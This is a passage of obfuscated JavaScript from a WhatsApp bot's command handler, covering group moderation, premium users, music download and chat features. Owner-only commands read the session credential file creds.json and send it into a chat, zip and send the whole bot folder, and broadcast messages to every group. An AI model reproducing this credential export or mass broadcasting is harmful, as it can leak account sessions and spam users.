        'document': _0x2fa037,
        'mimetype': "application/zip"
      }, {
        'quoted': _0x5f530e
      });
    };
    for (let _0x560c17 of ZipXeon) {
      if (_0x3a0bbf === _0x560c17) {
        let _0x319afd = fs.readFileSync("./C-SMedia/zip/" + _0x560c17 + ".zip");
        _0x2dc625(_0x319afd);
      }
    }
    const _0x110c93 = _0x106726 => {
      haikal.sendMessage(_0x39554b, {
        'document': _0x106726,
        'mimetype': "application/pdf"
      }, {
        'quoted': _0x5f530e
      });
    };
    for (let _0x23e6f9 of DocXeon) {
      if (_0x3a0bbf === _0x23e6f9) {
        let _0x2ec039 = fs.readFileSync("./C-SMedia/doc/" + _0x23e6f9 + ".pdf");
        _0x110c93(_0x2ec039);
      }
    }
    if (_0x5f530e.isGroup && !_0x5f530e.key.fromMe) {
      let _0x4eea39 = [...new Set([...(_0x5f530e.mentionedJid || []), ...(_0x5f530e.quoted ? [_0x5f530e.quoted.sender] : [])])];
      for (let _0x429089 of _0x4eea39) {
        if (afk.checkAfkUser(_0x429089, _afk)) {
          let _0x1f0785 = afk.getAfkId(_0x429089, _afk);
          let _0x518470 = afk.getAfkReason(_0x1f0785, _afk);
          _0x4242ca("Don't tag him, he's afk\n\n*Reason :* " + _0x518470);
        }
      }
      if (afk.checkAfkUser(_0x5f530e.sender, _afk)) {
        _afk.splice(afk.getAfkPosition(_0x5f530e.sender, _afk), 0x1);
        fs.writeFileSync("./dtbs/afk-user.json", JSON.stringify(_afk));
        _0x239047.sendTextWithMentions(_0x5f530e.chat, '@' + _0x5f530e.sender.split('@')[0x0] + " have returned from afk", _0x5f530e);
      }
    }
    switch (_0x418bf4) {
      case 'addprem':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x2) {
          return _0x4242ca("Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d");
        }
        if (_0x5f530e.mentionedJid.length !== 0x0) {
          for (let _0x5519fa = 0x0; _0x5519fa < _0x5f530e.mentionedJid.length; _0x5519fa++) {
            addPremiumUser(_0x5f530e.mentionedJid[0x0], _0x4376c7[0x1], premium);
          }
          _0x4242ca("Premium Success");
        } else {
          addPremiumUser(_0x4376c7[0x0] + '@s.whatsapp.net', _0x4376c7[0x1], premium);
          _0x4242ca('Success');
        }
        break;
      case "enc":
      case "encrypt":
      case "obfuscate":
        {
          if (!_0x11eb7e) {
            return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " const time = require('money')");
          }
          let _0x4335ea = await _0x2307bb(q);
          _0x4242ca('' + _0x4335ea.result);
        }
        break;
      case "delprem":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Use :\n*#delprem* @tag\n*#delprem* number");
        }
        if (_0x5f530e.mentionedJid.length !== 0x0) {
          for (let _0x250d69 = 0x0; _0x250d69 < _0x5f530e.mentionedJid.length; _0x250d69++) {
            premium.splice(getPremiumPosition(_0x5f530e.mentionedJid[_0x250d69], premium), 0x1);
            fs.writeFileSync('./dtbs/premium.json', JSON.stringify(premium));
          }
          _0x4242ca("Delete success");
        } else {
          premium.splice(getPremiumPosition(_0x4376c7[0x0] + "@s.whatsapp.net", premium), 0x1);
          fs.writeFileSync("./dtbs/premium.json", JSON.stringify(premium));
          _0x4242ca("Success");
        }
        break;
      case "listprem":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          let _0x3e04ae = require("./dtbs/premium.json");
          let _0xaef975 = "*------「 LIST PREMIUM 」------*\n\n";
          for (let _0x25d8f5 of _0x3e04ae) {
            _0xaef975 += "Number : " + _0x25d8f5.id + "\n";
            _0xaef975 += "Expired : " + _0x25d8f5.expired + " Second\n";
          }
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': _0xaef975,
            'mentions': i
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "deletesession":
      case "delsession":
      case "clearsession":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          fs.readdir("./session", async function (_0x4017fb, _0x5d6c3e) {
            if (_0x4017fb) {
              console.log("Unable to scan directory: " + _0x4017fb);
              return _0x4242ca("Unable to scan directory: " + _0x4017fb);
            }
            let _0x59724f = await _0x5d6c3e.filter(_0x4cac6b => _0x4cac6b.startsWith("pre-key") || _0x4cac6b.startsWith("sender-key") || _0x4cac6b.startsWith("session-") || _0x4cac6b.startsWith("app-state"));
            console.log(_0x59724f.length);
            let _0x42694c = "Detected " + _0x59724f.length + " junk files\n\n";
            if (_0x59724f.length == 0x0) {
              return _0x4242ca(_0x42694c);
            }
            _0x59724f.map(function (_0x1a5624, _0xbe5ab3) {
              _0x42694c += _0xbe5ab3 + 0x1 + (". " + _0x1a5624 + "\n");
            });
            _0x4242ca(_0x42694c);
            await sleep(0x7d0);
            _0x4242ca("Delete junk files...");
            await _0x59724f.forEach(function (_0x3c8120) {
              fs.unlinkSync("./session/" + _0x3c8120);
            });
            await sleep(0x7d0);
            _0x4242ca("Successfully deleted all the trash in the session folder");
          });
        }
        break;
      case "join":
        try {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          if (!_0x208b05) {
            return _0x4242ca("Enter Group Link!");
          }
          if (!isUrl(_0x4376c7[0x0]) && !_0x4376c7[0x0].includes("whatsapp.com")) {
            return _0x4242ca("Link Invalid!");
          }
          _0x4242ca(mess.wait);
          let _0x100b61 = _0x4376c7[0x0].split('https://chat.whatsapp.com/')[0x1];
          await _0x239047.groupAcceptInvite(_0x100b61).then(_0x497119 => _0x4242ca(json(_0x497119)))["catch"](_0xf8759f => _0x4242ca(json(_0xf8759f)));
        } catch {
          _0x4242ca("Failed to join the Group");
        }
        break;
      case "getsession":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        _0x4242ca("Wait a moment, currently retrieving your session file");
        let _0x48b282 = await fs.readFileSync("./session/creds.json");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'document': _0x48b282,
          'mimetype': 'application/json',
          'fileName': "creds.json"
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "shutdown":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        _0x4242ca("Goodbye🖐");
        await sleep(0xbb8);
        process.exit();
        break;
      case "restart":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        _0x4242ca("In Process....");
        exec("pm2 restart all");
        break;
      case "autoread":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " on/off");
        }
        if (q === 'on') {
          autoread = true;
          _0x4242ca("Successfully changed autoread to " + q);
        } else if (q === "off") {
          autoread = false;
          _0x4242ca("Successfully changed autoread to " + q);
        }
        break;
      case 'autotyping':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " on/off");
        }
        if (q === 'on') {
          autoTyping = true;
          _0x4242ca("Successfully changed auto-typing to " + q);
        } else if (q === "off") {
          autoTyping = false;
          _0x4242ca("Successfully changed auto-typing to " + q);
        }
        break;
      case "autorecording":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " on/off");
        }
        if (q === 'on') {
          autoRecording = true;
          _0x4242ca("Successfully changed auto-recording to " + q);
        } else if (q === "off") {
          autoRecording = false;
          _0x4242ca("Successfully changed auto-recording to " + q);
        }
        break;
      case "autorecordtyp":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " on/off");
        }
        if (q === 'on') {
          autorecordtype = true;
          _0x4242ca("Successfully changed auto recording and typing to " + q);
        } else if (q === "off") {
          autorecordtype = false;
          _0x4242ca("Successfully changed auto recording and typing to " + q);
        }
        break;
      case 'autoswview':
      case "autostatusview":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca('on/off?');
          }
          if (_0x4376c7[0x0] === 'on') {
            autoswview = true;
            _0x4242ca(_0x418bf4 + " is enabled");
          } else if (_0x4376c7[0x0] === "off") {
            autoswview = false;
            _0x4242ca(_0x418bf4 + " is disabled");
          }
        }
        break;
      case 'autobio':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " on/off");
        }
        if (q == 'on') {
          autobio = true;
          _0x4242ca("Successfully Changed AutoBio To " + q);
        } else if (q == "off") {
          autobio = false;
          _0x4242ca("Successfully Changed AutoBio To " + q);
        }
        break;
      case "mode":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x4376c7.length < 0x1) {
          return _0x4242ca("Example " + (_0x1e0f65 + _0x418bf4) + " public/self");
        }
        if (q == "public") {
          _0x239047["public"] = true;
          _0x4242ca(mess.done);
        } else if (q == "self") {
          _0x239047["public"] = false;
          _0x4242ca(mess.done);
        }
        break;
      case "setexif":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (!_0x208b05) {
          return _0x4242ca("Example : " + (_0x1e0f65 + _0x418bf4) + " packname|author");
        }
        global.packname = _0x208b05.split('|')[0x0];
        global.author = _0x208b05.split('|')[0x1];
        _0x4242ca("Exif successfully changed to\n\n• Packname : " + global.packname + "\n• Author : " + global.author);
        break;
      case "setpp":
      case "setpp":
      case 'setppbot':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (!_0x50ec5a) {
          return _0x4242ca("Send/Reply Image With Caption " + (_0x1e0f65 + _0x418bf4));
        }
        if (!/image/.test(_0x49e192)) {
          return _0x4242ca("Send/Reply Image With Caption " + (_0x1e0f65 + _0x418bf4));
        }
        if (/webp/.test(_0x49e192)) {
          return _0x4242ca("Send/Reply Image With Caption " + (_0x1e0f65 + _0x418bf4));
        }
        var _0x215bde = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a, "ppbot.jpeg");
        if (_0x4376c7[0x0] == "full") {
          var {
            img: _0x199f2f
          } = await generateProfilePicture(_0x215bde);
          await _0x239047.query({
            'tag': 'iq',
            'attrs': {
              'to': _0x8a38dc,
              'type': 'set',
              'xmlns': "w:profile:picture"
            },
            'content': [{
              'tag': "picture",
              'attrs': {
                'type': "image"
              },
              'content': _0x199f2f
            }]
          });
          fs.unlinkSync(_0x215bde);
          _0x4242ca(mess.done);
        } else {
          var _0x3b6477 = await _0x239047.updateProfilePicture(_0x8a38dc, {
            'url': _0x215bde
          });
          fs.unlinkSync(_0x215bde);
          _0x4242ca(mess.done);
        }
        break;
      case "block":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        let _0x13c1dc = _0x5f530e.mentionedJid[0x0] ? _0x5f530e.mentionedJid[0x0] : _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x208b05.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x239047.updateBlockStatus(_0x13c1dc, "block").then(_0x2d1d15 => _0x4242ca(json(_0x2d1d15)))['catch'](_0x2f67a9 => _0x4242ca(json(_0x2f67a9)));
        break;
      case 'unblock':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        let _0x48bbcb = _0x5f530e.mentionedJid[0x0] ? _0x5f530e.mentionedJid[0x0] : _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x208b05.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x239047.updateBlockStatus(_0x48bbcb, "unblock").then(_0x2a9f4c => _0x4242ca(json(_0x2a9f4c)))["catch"](_0x15b841 => _0x4242ca(json(_0x15b841)));
        break;
      case 'leave':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        _0x4242ca("Bye Everyone 🥺");
        await _0x239047.groupLeave(_0x5f530e.chat);
        break;
      case "backup":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (_0x5f530e.isGroup) {
          return _0x4242ca(mess['private']);
        }
        _0x4242ca(mess.wait);
        exec("zip backup.zip *");
        let _0x48f8b1 = await fs.readFileSync("./backup.zip");
        await _0x239047.sendMessage(_0x5f530e.chat, {
          'document': _0x48f8b1,
          'mimetype': "application/zip",
          'fileName': 'backup.zip'
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          if (!_0x208b05) {
            return _0x4242ca("Which text?\n\nExample : " + (_0x1e0f65 + _0x418bf4) + " It's holiday tomorrow ");
          }
          let _0x4a6658 = await _0x239047.groupFetchAllParticipating();
          let _0x5b5b3b = Object.entries(_0x4a6658).slice(0x0).map(_0x16fae5 => _0x16fae5[0x1]);
          let _0x321419 = _0x5b5b3b.map(_0x3feb0d => _0x3feb0d.id);
          _0x4242ca("Send Broadcast To " + _0x321419.length + " Group Chat, End Time " + _0x321419.length * 1.5 + " second");
          for (let _0x487bdd of _0x321419) {
            await sleep(0x5dc);
            let _0x43c289 = "```" + ("\n\n" + _0x208b05 + "\n\n") + "```" + "\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ";
            _0x239047.sendMessage(_0x487bdd, {
              'text': _0x43c289,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': "> 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝙱𝚈 𝙲𝚂𝚄𝙸𝚃",
                  'body': "𝚂𝙴𝙽𝚃 " + _0x487bdd.length + " 𝙶𝚁𝙾𝚄𝙿",
                  'thumbnailUrl': "https://files.catbox.moe/l1srou.jpg",
                  'sourceUrl': global.link,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            });
          }
          _0x4242ca("> 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝚂𝙴𝙽𝚃 " + _0x321419.length + " 𝙶𝚁𝙾𝚄𝙿😁");
        }
        break;
      case 'delete':
      case "del":
        {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.done);
          }
          if (!_0x5f530e.quoted) {
            throw false;
          }
          let {
            chat: _0x3413bb,
            fromMe: _0x248184,
            id: _0x3d0a3c,
            isBaileys: _0x5d7cd8
          } = _0x5f530e.quoted;
          if (!_0x5d7cd8) {
            return _0x4242ca("The message was not sent by a bot!");
          }
          _0x239047.sendMessage(_0x5f530e.chat, {
            'delete': {
              'remoteJid': _0x5f530e.chat,
              'fromMe': true,
              'id': _0x5f530e.quoted.id,
              'participant': _0x5f530e.quoted.sender
            }
          });
        }
        break;
      case "music":
        {
          await _0x740dec();
          try {
            if (!_0x208b05) {
              return _0x4242ca("🎵 *Example:* " + (_0x1e0f65 + _0x418bf4) + " Born in hell");
            }
            const _0x9bd52c = require("yt-search");
            let _0xe5a4c2 = await _0x9bd52c(_0x208b05);
            if (!_0xe5a4c2 || _0xe5a4c2.videos.length === 0x0) {
              return _0x4242ca("❌ *No video found.* Please try with a different keyword.");
            }
            let _0x266419 = _0xe5a4c2.videos[0x0];
            let {
              title: _0x1d1c96,
              thumbnail: _0x164746,
              videoId: _0x125294
            } = _0x266419;
            const _0xd1a3b6 = "https://www.youtube.com/watch?v=" + _0x125294;
            const _0x53d663 = 'https://api.davidcyriltech.my.id/spotifydl?url=' + encodeURIComponent(_0xd1a3b6);
            const _0x1e8a34 = await axios.get(_0x53d663);
            if (!_0x1e8a34.data || !_0x1e8a34.data.status || !_0x1e8a34.data.data || !_0x1e8a34.data.data.dl) {
              return _0x4242ca("🚫 *Error fetching audio from the URL.* Please try again later.");
            }
            const {
              dl: _0x5c3b9b
            } = _0x1e8a34.data.data;
            const _0x53f4e6 = {
              'audio': {
                'url': _0x5c3b9b
              },
              'mimetype': 'audio/mpeg',
              'fileName': _0x1d1c96 + ".mp3",
              'ptt': true,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'mediaType': 0x2,
                  'mediaUrl': _0xd1a3b6,
                  'title': _0x1d1c96,
                  'body': "CSUIT",
                  'sourceUrl': _0xd1a3b6,
                  'thumbnail': await (await fetch(_0x164746)).buffer()
                }
              }
            };
            await _0x239047.sendMessage(_0x5f530e.chat, _0x53f4e6, {
              'quoted': _0x5f530e
            });
          } catch (_0x2f4b7f) {
            console.error("Error in play command:", _0x2f4b7f);
            _0x4242ca("⚠️ *An error occurred while processing your request.* Please try again or try song, music, Spotify, spdl.");
          }
        }
        break;
      case "lostboyai":
        {
          if (!_0x208b05) {
            return _0x4242ca("*• Example:* " + (_0x1e0f65 + _0x418bf4) + " Who is LostBoy");
          }
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '⏱️',
              'key': _0x5f530e.key
            }
          });
          try {
            let _0x2c7ccd;
            if (/who is lostboy/i.test(_0x208b05)) {
              _0x2c7ccd = "LostBoy is my Developer. He is 14 years of age, open-minded, and sensible. Very friendly and playful!";
            } else {
              let _0x4c7dba = await (await fetch('https://api.davidcyriltech.my.id/ai/chatbot?query=' + encodeURIComponent(_0x208b05))).json();
              if (!_0x4c7dba.result) {
                return _0x4242ca("Failed to fetch AI response. Please try again later.");
              }
              _0x2c7ccd = _0x4c7dba.result;
            }
            let _0x2e26ae = generateWAMessageFromContent(_0x5f530e.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': "> LostBoy - AI\n\n" + _0x2c7ccd
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                      'text': global.botname
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'hasMediaAttachment': false,
                      ...(await prepareWAMessageMedia({
                        'image': fs.readFileSync('./C-SMedia/menu3.jpg')
                      }, {
                        'upload': _0x239047.waUploadToServer
                      }))
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "quick_replyCsuit",
                        'buttonParamsJson': "{\"display_text\":\"Nice LostBoyTech - AI\",\"id\":\".mangap\"}"
                      }]
                    }),
                    'contextInfo': {
                      'mentionedJid': [_0x5f530e.sender],
                      'forwardingScore': 0x3e7,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "0@newsletter",
                        'newsletterName': global.botname,
                        'serverMessageId': 0x8f
                      }
                    }
                  })
                }
              }
            }, {
              'quoted': _0x5f530e
            });
            await _0x239047.relayMessage(_0x5f530e.chat, _0x2e26ae.message, {});
          } catch (_0x53d28c) {
            console.error("AI Chatbot Error:", _0x53d28c);
            return _0x4242ca("An error occurred while processing your request. Please try again.");
          }
        }
        break;
      case "closetime":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (_0x4376c7[0x1] == 'detik') {
          var _0x2186b3 = _0x4376c7[0x0] * "1000";
        } else {
          if (_0x4376c7[0x1] == "menit") {
            var _0x2186b3 = _0x4376c7[0x0] * "60000";
          } else {
            if (_0x4376c7[0x1] == "jam") {
              var _0x2186b3 = _0x4376c7[0x0] * "3600000";
            } else {
              if (_0x4376c7[0x1] == "hari") {
                var _0x2186b3 = _0x4376c7[0x0] * '86400000';
              } else {
                return _0x4242ca("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x4242ca("Close time " + q + " starting from now");
        setTimeout(() => {
          _0x239047.groupSettingUpdate(_0x5f530e.chat, 'announcement');
          _0x4242ca("*Closed* group closed by admin\nnow only admin can send messages");
        }, _0x2186b3);
        break;
      case "opentime":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (_0x4376c7[0x1] == "second") {
          var _0x2186b3 = _0x4376c7[0x0] * "1000";
        } else {
          if (_0x4376c7[0x1] == "minute") {
            var _0x2186b3 = _0x4376c7[0x0] * "60000";
          } else {
            if (_0x4376c7[0x1] == 'hour') {
              var _0x2186b3 = _0x4376c7[0x0] * '3600000';
            } else {
              if (_0x4376c7[0x1] == "day") {
                var _0x2186b3 = _0x4376c7[0x0] * "86400000";
              } else {
                return _0x4242ca("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x4242ca("Open time " + q + " starting from now");
        setTimeout(() => {
          _0x239047.groupSettingUpdate(_0x5f530e.chat, 'not_announcement');
          _0x4242ca("*Opened* The group is opened by admin\nNow members can send messages");
        }, _0x2186b3);
        break;
      case 'kick':
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        let _0x3279c7 = _0x5f530e.mentionedJid[0x0] ? _0x5f530e.mentionedJid[0x0] : _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x208b05.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x239047.groupParticipantsUpdate(_0x5f530e.chat, [_0x3279c7], "remove").then(_0x1f0453 => _0x4242ca(json(_0x1f0453)))["catch"](_0x353675 => _0x4242ca(json(_0x353675)));
        break;
      case 'add':
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        let _0x273412 = _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x208b05.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x239047.groupParticipantsUpdate(_0x5f530e.chat, [_0x273412], 'add').then(_0x177839 => _0x4242ca(json(_0x177839)))["catch"](_0x10f97c => _0x4242ca(json(_0x10f97c)));
        break;
      case "promote":
        {
          if (!_0x11eb7e) {
            return _0x4242ca("*Only Premium Members Are Allowed To Use This Command*");
          }
          if (!_0x5f530e.isGroup) {
            return _0x4242ca("Create In Stupid Group ");
          }
          if (!_0x4f407d) {
            return _0x4242ca("Bots are not admins, dude ");
          }
          if (!_0x299dec) {
            return _0x4242ca("I thought you were the group admin ");
          }
          await _0x740dec();
          let _0x1f1551 = _0x5f530e.mentionedJid[0x0] ? _0x5f530e.mentionedJid[0x0] : _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x208b05.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x239047.groupParticipantsUpdate(_0x39554b, [_0x1f1551], "promote");
        }
        break;
      case "demote":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        let _0xfbda29 = _0x5f530e.mentionedJid[0x0] ? _0x5f530e.mentionedJid[0x0] : _0x5f530e.quoted ? _0x5f530e.quoted.sender : _0x208b05.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x239047.groupParticipantsUpdate(_0x5f530e.chat, [_0xfbda29], 'demote').then(_0x496d1a => _0x4242ca(json(_0x496d1a)))["catch"](_0x2fabb7 => _0x4242ca(json(_0x2fabb7)));
        break;
      case "setname":
      case "setsubject":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (!_0x208b05) {
          return "Text ?";
        }
        await _0x239047.groupUpdateSubject(_0x5f530e.chat, _0x208b05).then(_0x35772e => _0x4242ca(mess.success))["catch"](_0xfb9530 => _0x4242ca(json(_0xfb9530)));
        break;
      case "setdesc":
      case 'setdesk':
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (!_0x208b05) {
          return "Text ?";
        }
        await _0x239047.groupUpdateDescription(_0x5f530e.chat, _0x208b05).then(_0x38b065 => _0x4242ca(mess.success))["catch"](_0x481edb => _0x4242ca(json(_0x481edb)));
        break;
      case 'setppgroup':
      case "setppgrup":
      case "setppgc":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (!_0x50ec5a) {
          return _0x4242ca("Send/Reply Image With Caption " + (_0x1e0f65 + _0x418bf4));
        }
        if (!/image/.test(_0x49e192)) {
          return _0x4242ca("Send/Reply Image With Caption " + (_0x1e0f65 + _0x418bf4));
        }
        if (/webp/.test(_0x49e192)) {
          return _0x4242ca("Send/Reply Image With Caption " + (_0x1e0f65 + _0x418bf4));
        }
        var _0x215bde = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a, 'ppbot.jpeg');
        if (_0x4376c7[0x0] == "full") {
          var {
            img: _0x199f2f
          } = await generateProfilePicture(_0x215bde);
          await _0x239047.query({
            'tag': 'iq',
            'attrs': {
              'to': _0x5f530e.chat,
              'type': "set",
              'xmlns': 'w:profile:picture'
            },
            'content': [{
              'tag': "picture",
              'attrs': {
                'type': 'image'
              },
              'content': _0x199f2f
            }]
          });
          fs.unlinkSync(_0x215bde);
          _0x4242ca(mess.done);
        } else {
          var _0x3b6477 = await _0x239047.updateProfilePicture(_0x5f530e.chat, {
            'url': _0x215bde
          });
          fs.unlinkSync(_0x215bde);
          _0x4242ca(mess.done);
        }
        break;
      case 'tagall':
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e && !_0x2fc88e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d && !_0x11eb7e && !_0x2fc88e) {
          return _0x4242ca(mess.botAdmin);
        }
        let _0x550a35 = "*👥 Tag All*\n \n                 🗞️ *Message : " + (q ? q : "blank") + "*\n\n";
        for (let _0x81e039 of _0x5ef702) {
          _0x550a35 += "• @" + _0x81e039.id.split('@')[0x0] + "\n";
        }
        _0x239047.sendMessage(_0x5f530e.chat, {
          'text': _0x550a35,
          'mentions': _0x5ef702.map(_0x2f4e62 => _0x2f4e62.id)
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "hidetag":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e && !_0x2fc88e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d && !_0x11eb7e && !_0x2fc88e) {
          return _0x4242ca(mess.botAdmin);
        }
        _0x239047.sendMessage(_0x5f530e.chat, {
          'text': q ? q : '',
          'mentions': _0x5ef702.map(_0x3511f8 => _0x3511f8.id)
        }, {
          'quoted': _0x5f530e
        });
        break;
      case 'totag':
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x4f407d && !_0x11eb7e && !_0x2fc88e) {
          return _0x4242ca(mess.botAdmin);
        }
        if (!_0x299dec && !_0x11eb7e && !_0x2fc88e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x5f530e.quoted) {
          return _0x4242ca("Reply messages with captions " + (_0x1e0f65 + _0x418bf4));
        }
        _0x239047.sendMessage(_0x5f530e.chat, {
          'forward': _0x5f530e.quoted.fakeObj,
          'mentions': _0x5ef702.map(_0x140c75 => _0x140c75.id)
        });
        break;
      case "group":
      case "grup":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (_0x4376c7[0x0] === "close") {
          await _0x239047.groupSettingUpdate(_0x5f530e.chat, "announcement").then(_0x5cb485 => _0x4242ca("Success In Closing The Group 🕊️"))['catch'](_0xc8d3c5 => _0x4242ca(json(_0xc8d3c5)));
        } else if (_0x4376c7[0x0] === 'open') {
          await _0x239047.groupSettingUpdate(_0x5f530e.chat, 'not_announcement').then(_0xf2e7ce => _0x4242ca("Success In Opening The Group 🕊️"))["catch"](_0x1b6175 => _0x4242ca(json(_0x1b6175)));
        } else {
          _0x4242ca("Mode " + _0x418bf4 + "\n\n\nType " + (_0x1e0f65 + _0x418bf4) + "open/close");
        }
        break;
      case "editinfo":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        if (_0x4376c7[0x0] === "open") {
